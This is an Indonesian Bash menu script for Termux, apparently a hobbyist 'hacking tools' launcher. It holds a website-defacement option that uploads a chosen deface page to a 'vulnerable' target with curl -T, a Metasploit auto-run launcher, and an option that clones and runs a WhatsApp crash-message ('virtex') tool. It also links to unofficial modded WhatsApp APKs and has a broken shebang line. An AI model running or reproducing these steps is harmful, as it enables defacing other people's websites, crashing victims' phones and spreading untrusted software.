#!\bin\bash
# Pembuat Tools Ini : M Alifio
# Tools Termux Shell
# Kalau Recode Cantumin Nama Pembuat Tools Aslinya!!
clear

#color
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
w='\033[37;1m'
y='\033[33;1m'


echo $r"┍━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑"
echo $r"│"$c"*"$w" Author : Muhammad Alifio "$r"         │"
echo $r"│"$c"*"$w" Whatsapp : 0812xxxxxxxxx "$r"         │"
echo $r"│"$c"*"$w" Instagram : @m_alifio    "$r"         │"
echo $r"│"$c"*"$w" Telegram : https://t.me/alifio "$r"   │"
echo $r"│════════════════════════════════════"$r"│"
echo $r"│"$c"*"$w" Happy New Year Bagi Yg Jomblo:v"$r"   │"
echo $r"┕━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┙"
echo -n $c"Waktu"$y" : " ; date
echo -n "Masukan Nama anda"$g" : " ;
read nama
sleep 2
echo
echo "[√] Nama Sudah Disetujui! " | lolcat
sleep 2
sleep 2
clear
echo $r"╲╲"$w"┏━━┓"$r"╲╲"$y"Author :"$c"M Alifio"
echo $r"╲━"$w"╋━━╋"$r"━╲"$y"Whatsapp :"$c"0812xxxxxxx"
echo $r"╲╲"$w"┃◯◯┃"$r"╲╲"$y"Instagram :"$c"@m_alifio"
echo $r"╲"$w"┏╯┈◣┃"$r"╲╲"$y"github :"$c"https://github.com/alifiogans"
echo $r"╲"$w"╰━┳┳╯"$r"╲╲"$y"telegram :"$c"https://t.me/alifio"
echo $r"▔▔▔"$w"┗┗"$r"▔▔▔"
echo "${w}____________________*_*_____________________"
sleep 1
sleep 1
echo
echo "${g}[✚]Selamat Datang $nama";
sleep 2
echo
echo $r"============="$y"=============="$g"=============="
sleep 2
echo "${y}[ 1 ] Bot Chatting"                   $g"                   [✔]"
echo "${y}[ 2 ] Webdav"                         $g"                         [✔] "
echo "${y}[ 3 ] Metasploit Auto-Run"            $g"            [✔]"
echo "${y}[ 4 ] Link Whatsapp kebal"            $g"            [✔]"
echo "${y}[ 5 ] Virtex For Whataapp"            $g"            [✔]"
echo "${y}[ 6 ] Install Bahan² nya!"            $g"            [✔]"
echo "${y}[ 99 ] Exit                  "
echo "${g}"
read -p "Pilih : " pilih;
if [ $pilih = "1" ];
then
    cd $HOME
    irssi
    /connect chat.freenode.net
    /nick $nama
    read nama
    /join #FIOteam
elif [ $pilih = "2" ];
then
    cd $HOME
    clear
    echo $r"_ _ _ ____ ___  ___  ____ _  _ 
| | | |___ |__] |  \ |__| |  | 
|_|_| |___ |__] |__/ |  |  \/"
    echo $y"Author :"$g" M Alifio"
    echo $y"Whatsapp :"$g"0812xxxxxxxx"
    echo
    echo $g"["$c"✺"$g"]" $w"masukkan web vuln mu"
    echo $r"Contoh : https://www.website.com"
    read -p "target : " target
    echo $g"["$c"✺"$g"]" $w "masukkan sc deface andalan mu"
    echo "${r}Contoh : index.html"
    read -p "script :" sc
    curl -T /storage/emulated/0/$sc $target
    echo $g"["$c"✔"$g"]" $w"cek web :" $target"/"$sc
elif [ $pilih = "3" ];
then
    cd $HOME
    clear
    cd AutoMetasploit
    sh AutoMetasploit.sh
elif [ $pilih = "4" ];
then
    cd $HOME
    clear
    echo $r"================================================="
  echo $c"             Link Whatsapp Inmune                "
  echo $c"            Author :"$g" M Alifio R               "
  echo $r"================================================="
  echo
  echo $y"[ 1 ]"$b"   WhatsApp Beta "
  echo $y"[ 2 ]"$b"   WhatsApp TQ   "
  echo $y"[ 3 ]"$b"   WhatsApp TK   "
  read -p "Pilih : " pilih;
  if [ $pilih = "1" ];
  then
      cd $HOME
      clear
      echo $r"================================================="
      echo $c"             Link Whatsapp Inmune                "
      echo $c"            Author :"$g" M Alifio R               "
      echo $r"================================================="
      echo
      sleep 2
      echo $r"*"$b" WhatsApp Beta Versi 2.19.368!"
      echo $w"https://www.techspot.com/downloads/6877-whatsapp-beta.html"
      sleep 2
      echo $r"*"$b" WhatsApp Beta Dark Mode Versi 2.19.366 "
      echo $w"https://www.mediafire.com/file/ouxz47pqnji2ut3/WhatsApp_2.19.368_.apk/file"
      sleep 2
      echo $y"[✤]"$c" Copy Link Diatas Dan  "
      sleep 2
      echo $y"[✤]"$c" Pastekan Ke Googlemu  "
      fi
  if [ $pilih = "2" ];
  then
      cd $HOME
      clear
      echo $r"================================================="
      echo $c"             Link Whatsapp Inmune                "
      echo $c"            Author :"$g" M Alifio R               "
      echo $r"================================================="
      echo
      echo $w"https://www.mediafire.com/file/5hnxv1en8toj8oa/TQWhatsApp_Inmune.apk/file"
      sleep 2
      echo $y"[✤]"$c" Copy Link Diatas Dan  "
      sleep 2
      echo $y"[✤]"$c" Pastekan Ke Googlemu  "
      fi
  if [ $pilih = "3" ];
  then
      cd $HOME
      clear
      echo $r"================================================="
      echo $c"             Link Whatsapp Inmune                "
      echo $c"            Author :"$g" M Alifio R               "
      echo $r"================================================="
      echo
      echo $w"http://www.mediafire.com/file/bn8wdcnz672a92e/TKWhatsApp_Inmune.apk/file"
      sleep 2
      echo $y"[✤]"$c" Copy Link Diatas Dan  "
      sleep 2
      echo $y"[✤]"$c" Pastekan Ke Googlemu  "
      fi
elif [ $pilih = "5" ];
then
    cd $HOME
    git clone https://github.com/muhammadfathul/VIRTEX
    clear
    cd VIRTEX
    chmod 777 virtex.sh
    sh virtex.sh
elif [ $pilih = "6" ];
then
    cd $HOME
    apt update && apt upgrade
    pkg install git
    apt install ruby
    apt install figlet
    pkg install lolcat
    gem install lolcat
    pkg install curl
    pkg install bash
    pip2 install mechanize
    echo $g"["$c"✔"$g"]"$w" Penginstallan Berhasil:)"
elif [ $pilih = "99" ];
then
    echo $c"T"$y"H"$g"A"$r"N"$w"K"$b"S"$p"*"$c"_"$g"*"
    sleep 2
    exit
 fi
